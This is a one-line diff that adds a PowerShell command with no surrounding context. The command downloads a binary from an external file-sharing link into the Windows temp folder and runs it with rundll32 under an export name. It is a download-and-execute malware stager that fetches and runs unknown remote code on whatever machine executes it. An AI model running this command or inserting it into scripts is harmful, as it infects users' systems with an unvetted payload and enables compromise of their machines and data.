@@ -1,0 +1,1 @@
+$path = $Env:temp+'\ukco.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://files.zohoexternal.com/public/workdrive-external/download/bsnaw83e8cf2a243447619488f24e84d65eb5',$path); C:\Windows\System32\rundll32.exe $path,miktop 
